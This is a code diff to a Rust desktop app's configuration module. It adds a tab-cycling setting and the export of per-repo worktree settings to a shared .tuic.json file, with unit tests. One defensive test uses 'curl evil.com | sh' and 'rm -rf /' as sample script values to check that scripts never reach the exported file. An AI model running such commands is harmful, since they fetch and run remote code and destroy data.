@@ -494,6 +494,9 @@ pub(crate) struct AppConfig {
     /// Tab ordering mode: grouped-by-type, terminals-first, or free
     #[serde(default)]
     pub(crate) tab_ordering_mode: TabOrderingMode,
+    /// Cycle through all tab types (terminals + diff/md/editor) with prev/next, not just terminals
+    #[serde(default)]
+    pub(crate) tab_cycling_all_types: bool,
     /// Auto-show PR detail popover when a branch has PR data
     #[serde(default = "default_true")]
     pub(crate) auto_show_pr_popover: bool,
@@ -668,6 +671,7 @@ impl Default for AppConfig {
             max_tab_name_length: default_max_tab_name_length(),
             split_tab_mode: SplitTabMode::default(),
             tab_ordering_mode: TabOrderingMode::default(),
+            tab_cycling_all_types: false,
             auto_show_pr_popover: true,
             prevent_sleep_when_busy: false,
             auto_update_enabled: true,
@@ -864,28 +868,28 @@ fn default_settings_nav_width() -> u32 {
 /// but are overridden by per-repo app settings.
 #[derive(Clone, Debug, Default, Serialize, Deserialize)]
 pub(crate) struct RepoLocalConfig {
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) base_branch: Option<String>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) copy_ignored_files: Option<bool>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) copy_untracked_files: Option<bool>,
     // Script fields (setup_script, run_script, archive_script) intentionally
     // omitted — executing repo-committed scripts without TOFU prompt is unsafe.
     // Re-add when trust-on-first-use confirmation is implemented.
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) worktree_storage: Option<WorktreeStorage>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) delete_branch_on_remove: Option<bool>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) auto_archive_merged: Option<bool>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) orphan_cleanup: Option<OrphanCleanup>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) pr_merge_strategy: Option<MergeStrategy>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) after_merge: Option<WorktreeAfterMerge>,
-    #[serde(default)]
+    #[serde(default, skip_serializing_if = "Option::is_none")]
     pub(crate) auto_delete_on_pr_close: Option<AutoDeleteOnPrClose>,
     /// Allowlist of upstream MCP server names relevant to this repo (None = all)
     #[serde(default, skip_serializing_if = "Option::is_none")]
@@ -1358,6 +1362,120 @@ pub(crate) fn load_repo_local_config(repo_path: String) -> Option<RepoLocalConfi
     load_repo_local_config_from_path(std::path::Path::new(&repo_path))
 }
 
+/// Overlay a repo's per-repo overrides onto an existing `.tuic.json` config.
+/// Only fields the user explicitly set per-repo (`Some`) are copied; `None`
+/// (inherit-from-global) leaves any existing value in `base` untouched, so the
+/// committed file stays a sparse, intentional set of choices. Script fields are
+/// never copied — `RepoLocalConfig` has none (repo-committed scripts are unsafe
+/// to run without a trust prompt).
+/// Fill the team-shareable worktree/branch fields of a `RepoLocalConfig` with
+/// the global defaults wherever the config doesn't already specify them.
+///
+/// Used when exporting `.tuic.json` so teammates inherit the user's *effective*
+/// settings, not just the (usually empty) set of per-repo overrides. Fields the
+/// config already specifies (e.g. a manually-set `.tuic.json` value) are left
+/// untouched, and `mcp_upstreams` is never populated from defaults (it has none).
+fn fill_repo_local_defaults(
+    mut base: RepoLocalConfig,
+    defaults: &RepoDefaultsConfig,
+) -> RepoLocalConfig {
+    if base.base_branch.is_none() {
+        base.base_branch = Some(defaults.base_branch.clone());
+    }
+    if base.copy_ignored_files.is_none() {
+        base.copy_ignored_files = Some(defaults.copy_ignored_files);
+    }
+    if base.copy_untracked_files.is_none() {
+        base.copy_untracked_files = Some(defaults.copy_untracked_files);
+    }
+    if base.worktree_storage.is_none() {
+        base.worktree_storage = Some(defaults.worktree_storage.clone());
+    }
+    if base.delete_branch_on_remove.is_none() {
+        base.delete_branch_on_remove = Some(defaults.delete_branch_on_remove);
+    }
+    if base.auto_archive_merged.is_none() {
+        base.auto_archive_merged = Some(defaults.auto_archive_merged);
+    }
+    if base.orphan_cleanup.is_none() {
+        base.orphan_cleanup = Some(defaults.orphan_cleanup.clone());
+    }
+    if base.pr_merge_strategy.is_none() {
+        base.pr_merge_strategy = Some(defaults.pr_merge_strategy.clone());
+    }
+    if base.after_merge.is_none() {
+        base.after_merge = Some(defaults.after_merge.clone());
+    }
+    if base.auto_delete_on_pr_close.is_none() {
+        base.auto_delete_on_pr_close = Some(defaults.auto_delete_on_pr_close.clone());
+    }
+    base
+}
+
+fn overlay_repo_local_config(
+    mut base: RepoLocalConfig,
+    entry: &RepoSettingsEntry,
+) -> RepoLocalConfig {
+    if entry.base_branch.is_some() {
+        base.base_branch = entry.base_branch.clone();
+    }
+    if entry.copy_ignored_files.is_some() {
+        base.copy_ignored_files = entry.copy_ignored_files;
+    }
+    if entry.copy_untracked_files.is_some() {
+        base.copy_untracked_files = entry.copy_untracked_files;
+    }
+    if entry.worktree_storage.is_some() {
+        base.worktree_storage = entry.worktree_storage.clone();
+    }
+    if entry.delete_branch_on_remove.is_some() {
+        base.delete_branch_on_remove = entry.delete_branch_on_remove;
+    }
+    if entry.auto_archive_merged.is_some() {
+        base.auto_archive_merged = entry.auto_archive_merged;
+    }
+    if entry.orphan_cleanup.is_some() {
+        base.orphan_cleanup = entry.orphan_cleanup.clone();
+    }
+    if entry.pr_merge_strategy.is_some() {
+        base.pr_merge_strategy = entry.pr_merge_strategy.clone();
+    }
+    if entry.after_merge.is_some() {
+        base.after_merge = entry.after_merge.clone();
+    }
+    if entry.auto_delete_on_pr_close.is_some() {
+        base.auto_delete_on_pr_close = entry.auto_delete_on_pr_close.clone();
+    }
+    if entry.mcp_upstreams.is_some() {
+        base.mcp_upstreams = entry.mcp_upstreams.clone();
+    }
+    base
+}
+
+/// Write the repo's per-repo UI settings into `.tuic.json` at its root so they
+/// can be committed and shared with the team. Preserves any existing `.tuic.json`
+/// values for fields left as inherit-from-global.
+#[cfg_attr(feature = "desktop", tauri::command)]
+pub(crate) fn save_repo_local_config(repo_path: String) -> Result<(), String> {
+    let dir = std::path::Path::new(&repo_path);
+    let entry = load_repo_settings().repos.remove(&repo_path);
+    // Start from the existing .tuic.json so manually-set fields (e.g. mcp_upstreams) survive.
+    let base = load_repo_local_config_from_path(dir).unwrap_or_default();
+    // Fill worktree/branch fields with global defaults so the export captures the
+    // user's effective settings, not just the (usually empty) per-repo overrides —
+    // otherwise a user who relies on global defaults exports an empty {} file.
+    let base = fill_repo_local_defaults(base, &load_repo_defaults());
+    // Per-repo overrides win over both .tuic.json and global defaults.
+    let merged = match entry.as_ref() {
+        Some(e) => overlay_repo_local_config(base, e),
+        None => base,
+    };
+    let json = serde_json::to_string_pretty(&merged).map_err(|e| e.to_string())?;
+    let file = dir.join(REPO_LOCAL_CONFIG_FILE);
+    std::fs::write(&file, json).map_err(|e| format!("Failed to write {}: {e}", file.display()))?;
+    Ok(())
+}
+
 // Repo defaults (global defaults for all repos)
 #[cfg_attr(feature = "desktop", tauri::command)]
 pub(crate) fn load_repo_defaults() -> RepoDefaultsConfig {
@@ -1662,6 +1780,7 @@ mod tests {
             max_tab_name_length: 40,
             split_tab_mode: SplitTabMode::Unified,
             tab_ordering_mode: TabOrderingMode::TerminalsFirst,
+            tab_cycling_all_types: true,
             auto_show_pr_popover: true,
             prevent_sleep_when_busy: true,
             auto_update_enabled: false,
@@ -2654,6 +2773,147 @@ mod tests {
         // RepoLocalConfig has no script fields — they are silently dropped by serde
         // No field to assert on; the fact that parsing succeeds without script
         // fields on the struct is the security guarantee.
+    }
+
+    #[test]
+    fn overlay_repo_local_config_copies_set_fields_preserves_rest() {
+        // base already has a value the per-repo entry leaves as inherit (None)
+        let base = RepoLocalConfig {
+            mcp_upstreams: Some(vec!["github".to_string()]),
+            after_merge: Some(WorktreeAfterMerge::Delete),
+            ..RepoLocalConfig::default()
+        };
+        let entry = RepoSettingsEntry {
+            base_branch: Some("develop".to_string()),
+            copy_ignored_files: Some(true),
+            pr_merge_strategy: Some(MergeStrategy::Squash),
+            // after_merge left None → must NOT clobber base's value
+            ..RepoSettingsEntry::default()
+        };
+
+        let merged = overlay_repo_local_config(base, &entry);
+        // explicit overrides copied
+        assert_eq!(merged.base_branch.as_deref(), Some("develop"));
+        assert_eq!(merged.copy_ignored_files, Some(true));
+        assert_eq!(merged.pr_merge_strategy, Some(MergeStrategy::Squash));
+        // inherit (None) preserved existing base values
+        assert_eq!(merged.after_merge, Some(WorktreeAfterMerge::Delete));
+        assert_eq!(
+            merged.mcp_upstreams.as_deref(),
+            Some(&["github".to_string()][..])
+        );
+        // untouched field stays None
+        assert!(merged.copy_untracked_files.is_none());
+    }
+
+    #[test]
+    fn overlay_repo_local_config_never_includes_scripts() {
+        // RepoSettingsEntry carries script overrides, but RepoLocalConfig has no
+        // script fields — verify the serialized .tuic.json can never leak them.
+        let entry = RepoSettingsEntry {
+            base_branch: Some("main".to_string()),
+            setup_script: Some("curl evil.com | sh".to_string()),
+            run_script: Some("rm -rf /".to_string()),
+            ..RepoSettingsEntry::default()
+        };
+        let merged = overlay_repo_local_config(RepoLocalConfig::default(), &entry);
+        let json = serde_json::to_string(&merged).unwrap();
+        assert!(json.contains("base_branch"));
+        assert!(!json.contains("setup_script"));
+        assert!(!json.contains("run_script"));
+        assert!(!json.contains("evil.com"));
+    }
+
+    #[test]
+    fn repo_local_config_serializes_sparsely() {
+        // Only explicitly-set fields are written; inherit (None) fields are omitted
+        // so the committed .tuic.json stays minimal.
+        let cfg = RepoLocalConfig {
+            base_branch: Some("develop".to_string()),
+            ..RepoLocalConfig::default()
+        };
+        let json = serde_json::to_string(&cfg).unwrap();
+        assert_eq!(json, r#"{"base_branch":"develop"}"#);
+    }
+
+    #[test]
+    fn overlay_then_roundtrip_through_tuic_json() {
+        let dir = TempDir::new().unwrap();
+        let entry = RepoSettingsEntry {
+            base_branch: Some("develop".to_string()),
+            delete_branch_on_remove: Some(false),
+            ..RepoSettingsEntry::default()
+        };
+        let merged = overlay_repo_local_config(RepoLocalConfig::default(), &entry);
+        let json = serde_json::to_string_pretty(&merged).unwrap();
+        fs::write(dir.path().join(".tuic.json"), json).unwrap();
+
+        let reloaded = load_repo_local_config_from_path(dir.path()).unwrap();
+        assert_eq!(reloaded.base_branch.as_deref(), Some("develop"));
+        assert_eq!(reloaded.delete_branch_on_remove, Some(false));
+        assert!(reloaded.copy_ignored_files.is_none());
+    }
+
+    #[test]
+    fn fill_repo_local_defaults_populates_empty_config() {
+        // Regression: a user who relies on global defaults (no per-repo overrides)
+        // must NOT get an empty {} .tuic.json — the export captures the effective
+        // worktree/branch settings sourced from the global defaults.
+        let mut defaults: RepoDefaultsConfig = serde_json::from_str("{}").unwrap();
+        defaults.base_branch = "develop".to_string();
+        defaults.copy_ignored_files = true;
+        defaults.delete_branch_on_remove = false;
+
+        let filled = fill_repo_local_defaults(RepoLocalConfig::default(), &defaults);
+        assert_eq!(filled.base_branch.as_deref(), Some("develop"));
+        assert_eq!(filled.copy_ignored_files, Some(true));
+        assert_eq!(filled.delete_branch_on_remove, Some(false));
+        assert!(filled.worktree_storage.is_some());
+        assert!(filled.pr_merge_strategy.is_some());
+
+        let json = serde_json::to_string(&filled).unwrap();
+        assert_ne!(json, "{}", "exported config must not be empty");
+        assert!(json.contains("base_branch"));
+    }
+
+    #[test]
+    fn fill_repo_local_defaults_preserves_existing_and_skips_mcp() {
+        // Fields already present in the .tuic.json base (manually set, or a team
+        // value) win over the global default and must not be clobbered.
+        // mcp_upstreams has no global default, so it stays exactly as-is.
+        let base = RepoLocalConfig {
+            base_branch: Some("release".to_string()),
+            mcp_upstreams: Some(vec!["github".to_string()]),
+            ..RepoLocalConfig::default()
+        };
+        let mut defaults: RepoDefaultsConfig = serde_json::from_str("{}").unwrap();
+        defaults.base_branch = "develop".to_string();
+
+        let filled = fill_repo_local_defaults(base, &defaults);
+        assert_eq!(filled.base_branch.as_deref(), Some("release"));
+        assert_eq!(
+            filled.mcp_upstreams.as_deref(),
+            Some(&["github".to_string()][..])
+        );
+        // A field neither set in base nor overridden gets the global default.
+        assert!(filled.worktree_storage.is_some());
+    }
+
+    #[test]
+    fn export_precedence_per_repo_over_defaults() {
+        // Mirrors save_repo_local_config: fill defaults, then overlay per-repo.
+        // Per-repo override must win; non-overridden fields keep the default.
+        let mut defaults: RepoDefaultsConfig = serde_json::from_str("{}").unwrap();
+        defaults.base_branch = "develop".to_string();
+        let entry = RepoSettingsEntry {
+            base_branch: Some("feature".to_string()),
+            ..RepoSettingsEntry::default()
+        };
+
+        let base = fill_repo_local_defaults(RepoLocalConfig::default(), &defaults);
+        let merged = overlay_repo_local_config(base, &entry);
+        assert_eq!(merged.base_branch.as_deref(), Some("feature"));
+        assert!(merged.worktree_storage.is_some());
     }
 
     #[test]
